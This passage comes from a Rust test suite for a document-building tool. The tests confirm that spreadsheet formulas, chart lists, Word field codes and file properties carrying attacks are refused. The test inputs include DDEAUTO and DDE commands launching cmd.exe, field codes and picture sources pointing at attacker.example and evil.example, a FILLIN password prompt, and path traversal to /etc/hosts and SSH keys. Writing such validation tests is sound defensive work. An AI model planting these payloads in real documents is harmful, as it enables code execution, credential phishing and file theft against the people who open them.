    }

    #[test]
    fn workbook_formulas_keep_what_the_xlsx_skill_writes() {
        for props in [
            json!({"formula": "SUM(B2:B4)"}),
            json!({"value": "=SUM(B2:B4)"}),
            json!({"value": "=B2/C2"}),
            json!({"formula": "B2/C2", "numberformat": "0.0%"}),
            json!({"formula": "B5*(1+10%)"}),
            json!({"value": r#"=TEXT(B2/C2,"0.0%")"#}),
            json!({"formula": "IFERROR(B4/B3-1,0)"}),
            json!({"formula": "IF(C5=0,0,B5/C5)"}),
            json!({"formula": "Data!B4"}),
            json!({"formula": "SUM('Q3 Sales'!B2:B9)"}),
            json!({"formula": "SUM('Jan:Dec'!B2)"}),
            json!({"formula": "SUM(Table1[Sales])"}),
            json!({"value": r#"=HYPERLINK("https://x","t")"#}),
            json!({"formula": r#"HYPERLINK("https://example.com/report?q=1","Report")"#}),
            json!({"formula": r#"HYPERLINK( "http://example.com" , "Site")"#}),
            json!({"formula": r#"HYPERLINK("mailto:a@example.com","Mail")"#}),
            json!({"formula": r##"HYPERLINK("#Summary!A1","Summary")"##}),
            // Text that does not start with `=` is a value, not a formula.
            json!({"value": r"See https://example.com or \\server\share | IMAGE"}),
            json!({"value": "Total"}),
            json!({"value": "42"}),
        ] {
            workbook(&[cell(props.clone())]).unwrap_or_else(|error| panic!("{props}: {error}"));
        }
        for props in [
            json!({"value": "=_xlfn.XLOOKUP(A2,B:B,C:C)"}),
            json!({"value": "=_xlfn._xlws.SORT(A2:A9)"}),
            json!({"formula": "STDEV.S(B2:B9)/AVERAGE(B2:B9)"}),
            json!({"formula": r#"IF(B2>0,"Growth (YoY)","")"#}),
            json!({"formula": "SUMPRODUCT(B2:B4,C2:C4)"}),
            json!({"formula": "VLOOKUP(A2,'Price List'!A:B,2,FALSE)"}),
            json!({"formula": "SUM(Table1[[#Data],[Sales]])"}),
            json!({"formula": r#"INDEX(Table1[Sales],MATCH("x",Table1[Name],0))"#}),
            json!({"formula": "SUM(Table1['#Count])"}),
            json!({"formula": "ROUND(PMT(B2/12,B3,-B4),2)"}),
            json!({"value": "=TODAY()-DATE(2026,1,1)"}),
            json!({"value": "-3.5"}),
            json!({"value": "+5"}),
            json!({"value": "-B2"}),
            json!({"value": "@B2"}),
        ] {
            workbook(&[cell(props.clone())]).unwrap_or_else(|error| panic!("{props}: {error}"));
        }
        for item in [
            json!({"command": "add", "parent": "/Sheet1", "type": "cellis", "props": {"ref": "A1:A10", "operator": "greaterThan", "value": "50", "fill": "FFFF00"}}),
            json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:C4", "name": "Sales", "data": "Name,Delta,Share\nNorth,-3.5,+2\nSouth,4,\"-0.25\"\nWest,1e3,7"}}),
            json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "dataRange": "Sheet1!A1:B5", "title": "Revenue"}}),
            // R56: the text of a chart, table or validation is no formula
            // unless it starts like one.
            json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "dataRange": "Sheet1!A1:B5", "title": "Revenue (USD)"}}),
            json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "line", "data": "Calls:10,20,30;Cost:5,8,12", "categories": "Q1,Q2,Q3", "title": "Call volume", "axistitle": "Amount (k)", "catTitle": "Quarter (2026)", "series1.name": "Sales (2026)"}}),
            json!({"command": "set", "path": "/Sheet1/chart[1]", "props": {"title": "销售额 (万元)"}}),
            json!({"command": "add", "parent": "/Sheet1/chart[1]", "type": "series", "props": {"name": "Sales (2026)", "values": "Sheet1!B2:B5"}}),
            json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:C4", "name": "Ledger", "columns": "Name,Amount (USD),Date"}}),
            json!({"command": "add", "parent": "/Sheet1", "type": "validation", "props": {"ref": "B2:B9", "type": "list", "formula1": "Yes,No", "prompt": "Pick one (required)", "promptTitle": "Pick (one)", "errorTitle": "Wrong value (see list)", "error": "Call support (ext. 12)"}}),
            // R57: inline lists keep their words, and one reference passes.
            json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "data": "Sales (k):1,2,3", "categories": "North (EU),South (US)"}}),
            json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:B2", "data": "Name,Amount (USD)\nAlice,5"}}),
            json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "data": "Name,Amount (USD)\nAlice,5", "categories": "'My Sheet'!A2:A5"}}),
            json!({"command": "add", "parent": "/Sheet1/chart[1]", "type": "series", "props": {"values": "Sheet1!$B$2:$B$5", "categories": "A2:A5"}}),
            // R61: officecli writes the cells of a list without `!` as
            // literals (`<c:numLit>`, `<c:strLit>`), never as a formula (see
            // `a_chart_keeps_inline_list_cells_as_literals` in
            // tests/assistant_host.rs). A list with `!` it writes whole as
            // the chart's formula, so that one is read as a formula (R62,
            // `a_list_with_a_reference_in_it_is_read_whole`).
            json!({"command": "add", "parent": "/Sheet1/chart[1]", "type": "series", "props": {"values": "WEBSERVICE(B2)"}}),
            json!({"command": "add", "parent": "/Sheet1", "type": "Chart-Series", "props": {"values": "INDIRECT(B2)"}}),
            json!({"command": "add", "parent": "/Sheet1", "type": "pivotTable", "props": {"position": "H1", "values": "IMAGE(B2)"}}),
            json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "data": "S1:1,2", "categories": "IMAGE(B2),North (EU)"}}),
        ] {
            workbook(std::slice::from_ref(&item)).unwrap_or_else(|error| panic!("{item}: {error}"));
        }
        // A sheet named like a target roots plain cells.
        workbook(&[
            json!({"command": "set", "path": "/Sheet1", "props": {"name": "Chart"}}),
            json!({"command": "set", "path": "/Chart/A1", "props": {"value": "See https://example.com"}}),
        ])
        .unwrap();
        // Every command the bundled skills teach (their Word and PowerPoint
        // tables too), and a chart titled as the xlsx skill asks: with its
        // unit in parentheses.
        let mut commands: Vec<Value> =
            serde_json::from_str(include_str!("testdata/skill-batches.json")).unwrap();
        commands.push(json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "dataRange": "Sheet1!A1:B5", "title": "Revenue (USD)"}}));
        check_formulas(&commands).unwrap();
        // Formulas are checked in workbooks only: a Word equation's `|x|`
        // and `\\` are maths.
        Document::new(CreateDocumentArgs {
            name: "a".into(),
            format: DocumentFormat::Docx,
            content: json!([{"command": "add", "parent": "/body", "type": "equation", "props": {"formula": r"|x| \\ y"}}]),
        })
        .unwrap();
    }

    #[test]
    fn text_that_starts_like_a_formula_says_how_to_keep_it_text() {
        for (text, first) in [
            ("+1 (555) 010-0100", '+'),
            ("- Review contract (legal)", '-'),
            ("=WEBSERVICE(B2)", '='),
        ] {
            let error = workbook(&[cell(json!({"value": text}))]).unwrap_err();
            assert!(
                error.contains(&format!(
                    "starts with {first}, so it is read as a formula, and it "
                )) && error.contains("start the value with an apostrophe (')"),
                "{text}: {error}"
            );
        }
        // officecli keeps a value after an apostrophe as text.
        for text in [
            "'+1 (555) 010-0100",
            "'- Review contract (legal)",
            "'=WEBSERVICE(B2)",
        ] {
            workbook(&[cell(json!({"value": text}))])
                .unwrap_or_else(|error| panic!("{text}: {error}"));
        }
        // A formula key is a formula: no apostrophe helps.
        let error = workbook(&[cell(json!({"formula": "WEBSERVICE(B2)"}))]).unwrap_err();
        assert!(!error.contains("apostrophe"), "{error}");
        // R63: officecli keeps the apostrophe of a chart's or a validation's
        // text visible, so none is offered there.
        for (item, first) in [
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "dataRange": "Sheet1!A1:B5", "title": "- Review contract (legal)"}}),
                '-',
            ),
            (
                json!({"command": "add", "parent": "/Sheet1", "type": "validation", "props": {"ref": "B2:B9", "type": "list", "formula1": "Yes,No", "prompt": "+ Pick one (required)"}}),
                '+',
            ),
        ] {
            let error = workbook(std::slice::from_ref(&item)).unwrap_err();
            assert!(
                error.contains(&format!(
                    "starts with {first}, so it is read as a formula, and it calls"
                )) && !error.contains("apostrophe"),
                "R63: {item}: {error}"
            );
        }
    }

    /// R62: officecli writes a chart list that holds a `!` whole into the
    /// chart's formula (`<c:f>Sheet1!$A$1,WEBSERVICE(B2)</c:f>`), so a list
    /// with `!` or `|` is read whole as a formula, and a sparkline's `data`
    /// is a reference.
    #[test]
    fn a_list_with_a_reference_in_it_is_read_whole() {
        let chart = |props: Value| json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": props});
        let series = |props: Value| json!({"command": "add", "parent": "/Sheet1/chart[1]", "type": "series", "props": props});
        let sparkline = |props: Value| json!({"command": "add", "parent": "/Sheet1", "type": "sparkline", "props": props});
        for (item, why) in [
            // The review's inputs.
            (
                series(json!({"values": "Sheet1!A1,WEBSERVICE(B2&A1)"})),
                "calls WEBSERVICE",
            ),
            (
                chart(
                    json!({"chartType": "column", "data": "S1:1,2", "categories": "Sheet1!A1,IMAGE(B2)"}),
                ),
                "calls IMAGE",
            ),
            (
                json!({"command": "set", "path": "/Sheet1/chart[1]", "props": {"series1.values": "Sheet1!A1,INDIRECT(B2)"}}),
                "calls INDIRECT",
            ),
            (
                series(json!({"values": "1,2", "categories": "Sheet1!A1,cmd|x!A1"})),
                "holds |",
            ),
            (
                series(json!({"values": "Sheet1!A1;IMAGE(B2)"})),
                "calls IMAGE",
            ),
            (
                series(json!({"values": "Sheet1!A1 IMAGE(B2)"})),
                "calls IMAGE",
            ),
            // A `|` is enough, and a `!` in labels is no reference.
            (
                chart(json!({"chartType": "column", "data": "S1:1,2", "categories": "A|B,C"})),
                "holds |",
            ),
            (
                chart(
                    json!({"chartType": "column", "data": "S1:1,2", "categories": "Hello!,World"}),
                ),
                "holds !, so the whole list is read as a formula",
            ),
            // R66: after the formula check the list must be a union of
            // references, so an expression or an allowlisted call is no
            // reference either.
            (
                series(json!({"values": "Sheet1!A1+Sheet1!A2"})),
                "holds !, so the whole list is read as a formula",
            ),
            (
                series(json!({"values": "Sheet1!A1,SUM(B2)"})),
                "holds !, so the whole list is read as a formula",
            ),
            // A sparkline's `data` is officecli's alias of `dataRange`.
            (
                json!({"command": "set", "path": "sparkline[1]", "props": {"data": "calc|x!A1:A5"}}),
                "holds |",
            ),
            (
                sparkline(json!({"location": "D2", "data": "powershell|'x'!A1:A5"})),
                "holds |",
            ),
            (
                sparkline(json!({"location": "D3", "data": "WEBSERVICE(B2)"})),
                "calls WEBSERVICE",
            ),
        ] {
            let error = workbook(std::slice::from_ref(&item)).unwrap_err();
            assert!(
                error.contains("item 0:") && error.contains(why),
                "R62: {item}: {error}"
            );
        }
        // Lists without `!` or `|` are still read cell by cell, and
        // references pass.
        for item in [
            chart(
                json!({"chartType": "column", "data": "S1:1,2", "categories": "North (EU),South (US)"}),
            ),
            json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:C4", "columns": "Name,Amount (USD),Date"}}),
            series(
                json!({"values": "Sheet1!$B$2:$B$5", "categories": "Sheet1!A2:A3,Sheet1!A5:A6"}),
            ),
            sparkline(json!({"location": "D1", "data": "Sheet1!A1:A5"})),
        ] {
            workbook(std::slice::from_ref(&item))
                .unwrap_or_else(|error| panic!("R62: {item}: {error}"));
        }
    }

    /// R64: `file:` is an address only where a word starts.
    #[test]
    fn a_file_address_starts_a_word() {
        let chart = |title: &str| json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "dataRange": "Sheet1!A1:B5", "title": title}});
        for item in [
            chart("Risk profile: by region"),
            cell(json!({"value": r#"=LEN("Risk profile: by region")"#})),
        ] {
            workbook(std::slice::from_ref(&item))
                .unwrap_or_else(|error| panic!("R64: {item}: {error}"));
        }
        for item in [
            chart("file:///etc/passwd"),
            chart("Read (file:x)"),
            chart("Read file:x"),
            cell(json!({"value": r#"=LEN("see file:x")"#})),
        ] {
            let error = workbook(std::slice::from_ref(&item)).unwrap_err();
            assert!(
                error.contains("names a file: address"),
                "R64: {item}: {error}"
            );
        }
    }

    #[test]
    fn each_property_takes_its_own_syntax() {
        let refused = |key: &str, text: &str| {
            refused_value(text, property(key, DocumentFormat::Docx)).is_some()
        };
        // Links: web and mail addresses, or a slide.
        for target in [
            "https://example.com",
            "mailto:a@example.com",
            "slide[3]",
            "/slide[3]",
            "/slide[2]/shape[@name=Title]",
        ] {
            assert!(!refused("link", target), "{target}");
        }
        for target in [
            "notes.txt",
            "body",
            "nextslide",
            "/body/p[1]",
            "slide[x]",
            "javascript:x",
            "file:///x",
        ] {
            assert!(refused("hyperlink", target), "{target}");
        }
        // Table data: rows inline, never a file or an address.
        for data in [
            "Name,Score\nAlice,90",
            "ab:c,d",
            "H1,H2;R1C1,R1C2",
            "Total",
            "https,x",
            // Prose: a folder is `.` or `~` and a slash; a drive followed by
            // numbers only is a one-letter chart series.
            ".t.csv",
            "A:1,2",
            "B:3.5,-4",
            "D:",
        ] {
            assert!(!refused("data", data), "{data}");
        }
        for data in [
            "/Users/x/t.csv",
            "https://x/t.csv",
            "https://x/t.csv,extra",
            "@t.csv",
            "C:\\t.csv",
            "C:t.csv",
            "c:x",
            "a:b,c",
            "~/t.csv",
            "\\\\server\\t.csv",
            "file:t.csv",
            "x/../../t.csv",
        ] {
            assert!(refused("data", data), "{data}");
        }
        // Fills: colours, gradients, an image as a data URI.
        for fill in [
            "FF0000",
            "accent1",
            "linear:FF0000-0000FF-90",
            "radial:FF0000-0000FF",
            "image:data:image/png;base64,iVBORw0KGgo=",
        ] {
            assert!(!refused("fill", fill), "{fill}");
            assert!(!refused("background", fill), "{fill}");
            assert!(!refused("shape.fill", fill), "{fill}");
        }
        for fill in [
            "image:/Users/x.png",
            "image:https://x/y.png",
            "linear:/Users/x",
            "radial:",
            "path:/x",
            "/x.png",
        ] {
            assert!(refused("fill", fill), "{fill}");
        }
        // Number formats keep their colons.
        for format in [
            "hh:mm",
            "[h]:mm:ss",
            "yyyy-mm-dd hh:mm",
            "0.00%",
            "#,##0.00",
        ] {
            assert!(!refused("numberformat", format), "{format}");
            assert!(!refused("numFmt", format), "{format}");
        }
        // Every other location check holds for them (R41).
        for format in [
            "\\$#,##0",
            "C:\\x",
            "C:x",
            "\\\\server\\x",
            "../x",
            "/x",
            "~/x",
            "file:x",
            "https://x",
            "javascript:x",
        ] {
            assert!(refused("numberformat", format), "{format}");
        }
        // Only those two keys: `format` is like any other.
        assert!(refused("format", "hh:mm"));
        assert!(refused("format", "file:///x"));
        // Lengths and numbers may start with a dot or a minus; a hidden
        // file may not.
        for length in [".5in", "-2pt", "0.5cm", "-.25", "E2:L18"] {
            assert!(!refused("x", length), "{length}");
        }
        for value in [".hidden", "./x", "/x", "~x", "C:x", "smb:x"] {
            assert!(refused("x", value), "{value}");
        }
    }

    /// One batch of `items` after a slide: its checks' answer, as a
    /// document's batch (the strictest; a deck's data has its own test, see
    /// `deck_data_is_read_whole`).
    fn checked(items: &[Value]) -> Result<(), String> {
        let mut commands = vec![json!({"command": "add", "parent": "/", "type": "slide"})];
        commands.extend(items.iter().cloned());
        check_batch(&mut commands, DocumentFormat::Docx)
    }

    /// The bypasses a review found against the real officecli (fix round 1):
    /// each must be refused before officecli runs.
    #[test]
    fn props_are_one_object_of_single_values() {
        for item in [
            // officecli also takes `["key=value"]` arrays.
            json!({"command": "add", "parent": "/slide[1]", "type": "table", "props": ["data=/etc/hosts"]}),
            json!({"command": "add", "parent": "/body", "type": "markdown", "props": ["src=/Users/me/.ssh/id_rsa"]}),
            json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": ["src=https://evil.example/x.png"]}),
            json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": ["src=C:\\Users\\me\\.ssh\\id_rsa"]}),
            json!({"command": "add", "parent": "/slide[1]", "type": "shape", "props": "src=/etc/hosts"}),
            // Nested objects and arrays.
            json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"image": {"text": "/Users/x/.ssh/id_rsa"}}}),
            json!({"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"fill": {"image": {"src": "/tmp/x.png"}}}}),
            json!({"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"text": ["a", "b"]}}),
            // Keys that differ only in case: officecli keeps the last.
            json!({"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"text": "x", "Text": "y"}}),
            json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"src": "data:image/png;base64,AAAA", "SRC": "/etc/hosts"}}),
            // A key .NET folds to `src` (U+017F).
            json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"\u{17f}rc": "x/../y"}}),
        ] {
            let error = checked(std::slice::from_ref(&item)).unwrap_err();
            assert!(error.contains("item 1:"), "{item}: {error}");
        }
    }

    #[test]
    fn diagrams_and_embedded_objects_are_refused() {
        for kind in [
            "diagram",
            "Diagram",
            "DIAGRAM",
            "diagram ",
            " diagram",
            "flowchart",
            "FlowChart",
            "ole",
            "OLE",
            "oleobject",
            "object",
            "embed",
            "package",
            "dia\u{301}gram",
            "",
        ] {
            let error = checked(&[json!({"command": "add", "parent": "/slide[1]", "type": kind, "props": {"mermaid": "flowchart TD; A-->B", "render": "image"}})])
                .unwrap_err();
            assert!(error.contains("item 1:"), "{kind:?}: {error}");
        }
        // An OLE package, as the review planted one.
        let error = checked(&[json!({"command": "add", "parent": "/slide[1]", "type": "ole", "props": {"src": "data:application/octet-stream;base64,TVqQAAMAAAAEAAAA", "oleKind": "package", "embedExt": "exe"}})])
            .unwrap_err();
        assert!(
            error.contains("\"ole\" elements cannot be added"),
            "{error}"
        );
        assert!(checked(&[json!({"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"text": "graph"}})]).is_ok());
    }

    #[test]
    fn table_data_never_climbs_out_of_the_folder() {
        for data in [
            "a,b/../../secret.csv",
            "a,b\\..\\..\\..\\..\\Users\\x\\.ssh\\id_rsa",
            "a;b/../../../../../../etc/hosts",
            "x\n/../../../../../etc/hosts",
            "x\n../../secret.csv",
            "x,y\\..\\..\\secret.csv",
            "x\t..\\secret.csv",
            "https://127.0.0.1:9/t.csv,extra",
        ] {
            let item = json!({"command": "add", "parent": "/slide[1]", "type": "table", "props": {"data": data}});
            assert!(checked(&[item]).is_err(), "{data:?}");
        }
        for data in [
            "Name,Score\nAlice,90",
            "ab:c,d",
            "Q1..Q4,ok",
            "data:text/csv,a,b",
        ] {
            let item = json!({"command": "add", "parent": "/slide[1]", "type": "table", "props": {"data": data}});
            assert!(checked(&[item]).is_ok(), "{data:?}");
        }
    }

    #[test]
    fn word_fields_show_only_page_numbers_and_dates() {
        let field = |props: Value| json!({"command": "add", "parent": "/body/p[1]", "type": "field", "props": props});
        for props in [
            json!({"instruction": " DDEAUTO c:\\windows\\system32\\cmd.exe \"/k calc.exe\" "}),
            json!({"instr": " INCLUDEPICTURE \"\\\\\\\\attacker.example\\\\s\\\\x.png\" \\d "}),
            json!({"code": "INCLUDETEXT \"x.docx\""}),
            json!({"fieldType": "mergefield", "name": "CustomerName"}),
            json!({"type": "if", "expression": "1 = 1"}),
            json!({"format": "yyyy"}),
        ] {
            assert!(checked(&[field(props.clone())]).is_err(), "{props}");
        }
        for props in [
            json!({"instruction": "PAGE"}),
            json!({"fieldType": "numpages"}),
            json!({"type": "date", "format": "yyyy-MM-dd"}),
            json!({"code": " time "}),
            json!({"instr": "TOC"}),
        ] {
            assert!(checked(&[field(props.clone())]).is_ok(), "{props}");
        }
        // A field code in any property is refused; the skills' footer page
        // number is fine.
        for props in [
            json!({"text": "see DDEAUTO here"}),
            json!({"text": "x", "field": "includepicture \"\\\\h\\s\""}),
            json!({"text": "Page ", "field": "dde x"}),
        ] {
            let item =
                json!({"command": "add", "parent": "/body", "type": "paragraph", "props": props});
            assert!(checked(&[item]).is_err(), "{props}");
        }
        let footer = json!({"command": "add", "parent": "/", "type": "footer", "props": {"type": "default", "text": "Page ", "field": "page"}});
        assert!(checked(&[footer]).is_ok());
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn typst_imports_built_at_run_time_reach_no_network() {
        // A stand-in Typst that, like the real one, fails to download a
        // package through the dead proxy, and would otherwise make the file.
        let script = r#"for a; do last=$a; done
case " $* " in *" --version "*) echo typst; exit 0 ;; esac
env > typst-env
if [ "$HTTPS_PROXY" = http://127.0.0.1:9 ] && [ "$https_proxy" = http://127.0.0.1:9 ]; then
  echo 'main.typ:10:8: error: failed to download package (https://packages.typst.org/preview/cetz-0.3.4.tar.gz: Connection Failed: Connect error: Connection refused (os error 61))' >&2
  exit 1
fi
printf '%%PDF-1.7 /Type /Page' > "$last""#;
        let f = fixture_in(None, Some(script), |dir| Some(stub_sandbox(dir, true)));
        for body in [
            "#let p = \"@\" + \"preview/cetz:0.3.4\"\n#import p: *",
            "#import \"\\u{40}preview/cetz:0.3.4\": *",
        ] {
            let error = f
                .call(
                    &id(),
                    json!({"name": "r", "format": "pdf", "content": body}),
                )
                .await
                .unwrap_err();
            assert!(error.contains("failed to download package"), "{error}");
        }
        assert!(f.record().attachments.is_empty());
        assert!(f.outputs().iter().all(|dir| !dir.join("out.pdf").exists()));
        // Typst ran under its own profile, which denies the network.
        let log = sandbox_log(&f);
        assert_eq!(
            log.iter()
                .filter(|line| line.ends_with("--version"))
                .count(),
            1
        );
        let compile = log.iter().find(|line| line.contains(" compile ")).unwrap();
        assert!(compile.contains("(deny network*)"), "{compile}");
        assert!(!compile.contains("(deny file-write*)"), "{compile}");
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn engine_text_shows_no_path_outside_the_document() {
        let f = fixture(
            None,
            Some(
                r#"echo "error: Access to the path '/Users/me/.ssh/id_rsa' is denied; also C:\\Users\\me\\x and /private/var/folders/x/y" >&2; exit 1"#,
            ),
        );
        let error = f
            .call(
                "call-1",
                json!({"name": "r", "format": "pdf", "content": "x"}),
            )
            .await
            .unwrap_err();
        assert!(
            !error.contains("/Users/me")
                && !error.contains("C:\\Users")
                && !error.contains("/private/var"),
            "{error}"
        );
        assert!(error.contains("'<path>'"), "{error}");
    }

    /// Fix round 2: every field type officecli adds reads `code` as a raw
    /// instruction; each residual the review found is refused.
    #[test]
    fn field_types_and_codes_are_checked_on_every_item() {
        let item = |parent: &str, kind: &str, props: Value| json!({"command": "add", "parent": parent, "type": kind, "props": props});
        let link = json!({"code": " LINK Excel.Sheet.12 \"\\\\\\\\attacker.example\\\\s\\\\x.xlsx\" \"Sheet1!R1C1\" \\a \\p "});
        let import = json!({"code": " IMPORT \"\\\\\\\\attacker.example\\\\s\\\\x.png\" "});
        let mut refused = vec![
            item("/body/p[1]", "pagenum", link.clone()),
            item("/body/p[1]", "page", import.clone()),
            item(
                "/body/p[1]",
                "date",
                json!({"code": " DATABASE \\d \"\\\\\\\\attacker.example\\\\s\\\\x.mdb\" \\s \"select 1\" "}),
            ),
            item(
                "/body/p[1]",
                "numpages",
                json!({"code": " FILLIN \"Your session expired. Enter your password:\" "}),
            ),
            item(
                "/body/p[1]",
                "pagenumber",
                json!({"code": " DDE\tc:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\" "}),
            ),
            item(
                "/body/p[1]",
                "time",
                json!({"code": " DDE\tc:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\" "}),
            ),
            item(
                "/body/p[1]",
                "time",
                json!({"code": " RD \"\\\\\\\\attacker.example\\\\s\\\\x.docx\" "}),
            ),
            item("/body/p[1]", "field", json!({"code": " LINK x "})),
            item(
                "/body/p[1]",
                "field",
                json!({"instruction": "PAGE", "text": "DDEAUTO"}),
            ),
            item(
                "/body/p[1]",
                "field",
                json!({"fieldType": "page", "code": " LINK x "}),
            ),
            item(
                "/body/p[1]",
                "page",
                json!({"code": "PAGE \\* MERGEFORMAT INCLUDEPICTURE x"}),
            ),
            item("/body/p[1]", "date", json!({"instr": "DATE HYPERLINK x"})),
            item("/body/p[1]", "time", json!({"field": "TIME MACROBUTTON x"})),
            item("/body/p[1]", "date", json!({"code": "\u{3000}EMBED x"})),
            item("/body", "paragraph", json!({"code": " AUTOTEXT x "})),
            item("/body", "paragraph", json!({"text": "DDE\tc:\\x"})),
            item(
                "/body",
                "paragraph",
                json!({"text": "x", "fieldType": "author"}),
            ),
            item("/body/p[1]", "field", json!({"fieldType": 1})),
        ];
        for kind in [
            "author",
            "title",
            "filename",
            "sectionpages",
            "createdate",
            "savedate",
            "printdate",
            "edittime",
            "numwords",
            "template",
        ] {
            for parent in ["/body/p[1]", "/footer[1]/p[1]"] {
                refused.push(item(parent, kind, link.clone()));
                refused.push(item(parent, kind, json!({})));
            }
        }
        for item in refused {
            assert!(checked(std::slice::from_ref(&item)).is_err(), "{item}");
        }
        for item in [
            item("/body/p[1]", "page", json!({"code": "PAGE"})),
            item("/body/p[1]", "page", json!({})),
            item(
                "/body/p[1]",
                "time",
                json!({"code": " TIME \\@ \"HH:mm\" "}),
            ),
            item("/body/p[1]", "field", json!({"fieldType": "page"})),
            item(
                "/body/p[1]",
                "field",
                json!({"instruction": "PAGE \\* MERGEFORMAT"}),
            ),
            item(
                "/body",
                "paragraph",
                json!({"text": "Click the link to import the database"}),
            ),
            item(
                "/",
                "footer",
                json!({"type": "default", "text": "Page ", "field": "page"}),
            ),
        ] {
            assert!(checked(std::slice::from_ref(&item)).is_ok(), "{item}");
        }
    }

    #[test]
    fn a_section_break_is_not_a_field() {
        let section = |props: Value| json!({"command": "add", "parent": "/body", "type": "section", "props": props});
        for props in [
            json!({"type": "nextPage", "orientation": "landscape"}),
            json!({"type": "continuous"}),
            json!({}),
        ] {
            let item = section(props);
            assert!(checked(std::slice::from_ref(&item)).is_ok(), "{item}");
        }
        for item in [
            json!({"command": "add", "parent": "/body/p[1]", "type": "field", "props": {"fieldType": "section"}}),
            json!({"command": "add", "parent": "/body", "type": "paragraph", "props": {"text": "x", "fieldType": "section"}}),
            section(json!({"type": "nextPage", "fieldType": "section"})),
            section(json!({"type": "nextPage", "code": " SECTION "})),
        ] {
            assert!(checked(std::slice::from_ref(&item)).is_err(), "{item}");
        }
    }

    #[test]
    fn property_keys_and_data_uris_have_their_own_grammar() {
        for props in [
            json!({"data=/etc/hosts": "x"}),
            json!({"data": "A,B", "data.": "/etc/hosts"}),
            json!({".data": "x"}),
            json!({"font..color": "x"}),
            json!({"2x": "x"}),
            json!({"src": "data:image/png;base64,x/../../../../private/tmp/probe-outside/secret.png"}),
            json!({"src": "data:image/png;base64,AAAA BBBB"}),
        ] {
            let item =
                json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": props});
            assert!(checked(std::slice::from_ref(&item)).is_err(), "{item}");
        }
        let item = json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"src": "data:image/png;base64,iVBORw0KGgo=", "font.color": "1F4E79", "docDefaults.fontSize": "11pt"}});
        assert!(checked(std::slice::from_ref(&item)).is_ok());
    }

    #[test]
    fn number_formats_keep_their_colons_but_name_no_address() {
        let refused = |format: &str| refused_value(format, Property::NumberFormat).is_some();
        for format in [
            "ssh://attacker/x",
            "mms://x",
            "hh:/etc/hosts",
            "dd:/x",
            "d:/x",
            "file:x",
        ] {
            assert!(refused(format), "{format}");
        }
        for format in [
            "[$-409]h:mm AM/PM",
            "$#,##0",
            "¥#,##0.00",
            "h:mm:ss",
            "mm:ss.0",
            "[h]:mm",
            "yyyy\"年\"m\"月\"",
            "#,##0;[Red]-#,##0",
            "0.00E+00",
            "@",
            "\"Total: \"0",
            "[$€-2] #,##0.00",
            "m/d/yyyy h:mm",
        ] {
            assert!(!refused(format), "{format}");
        }
        // A sheet named like a folder, whatever its case or spacing.
        for name in ["tmp", "Tmp", "TMP", "tmp ", " private"] {
            let mut commands = vec![
                json!({"command": "add", "parent": "/", "type": "sheet", "props": {"name": name}}),
                json!({"command": "set", "path": format!("/{name}/A1"), "props": {"value": "1"}}),
            ];
            assert!(
                check_batch(&mut commands, DocumentFormat::Xlsx).is_err(),
                "{name:?}"
            );
        }
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn the_quoted_typst_line_is_scrubbed_too() {
        let prelude = include_str!("pdf-prelude.typ").lines().count();
        let f = fixture(
            None,
            Some(&format!(
                "echo 'main.typ:{}:1: error: unknown variable: x' >&2; exit 1",
                prelude + 1
            )),
        );
        let error = f
            .call(
                "call-1",
                json!({"name": "r", "format": "pdf", "content": "#x api_key=sk-live-abcdefghijklmnopqrstuvwxyz0123"}),
            )
            .await
            .unwrap_err();
        assert!(
            error.contains("line 1, column 1: error: unknown variable"),
            "{error}"
        );
        assert!(
            !error.contains("sk-live-abcdefghijklmnopqrstuvwxyz0123"),
            "{error}"
        );
    }

    #[test]
    fn data_uris_are_typed_and_base64() {
        for uri in [
            "data:image/png;base64,iVBORw0KGgo=",
            "DATA:image/svg+xml;base64,PHN2Zy8+",
            "data:application/vnd.ms-excel;name=x.xls;base64,AAAA",
        ] {
            assert!(is_data_uri(uri), "{uri}");
        }
        for uri in [
            "data:image/png,raw",
            "data:;base64,AAAA",
            "data:image;base64,AAAA",
            "data:image/png;base64",
            "image/png;base64,AAAA",
        ] {
            assert!(!is_data_uri(uri), "{uri}");
        }
    }

    #[cfg(unix)]
    #[test]
    fn the_scratch_folder_is_made_private_when_it_is_ours() {
        use std::os::unix::fs::PermissionsExt;
        let mode = |path: &Path| std::fs::metadata(path).unwrap().permissions().mode() & 0o7777;
        let open = |path: &Path| {
            std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755)).unwrap()
        };
        let root = tempfile::tempdir().unwrap();
        // SAFETY: getuid has no preconditions and cannot fail.
        let uid = unsafe { libc::getuid() };
        let fresh = root.path().join("fresh");
        private_folder(&fresh, uid).unwrap();
        assert_eq!(mode(&fresh), 0o700);
        let ours = root.path().join("ours");
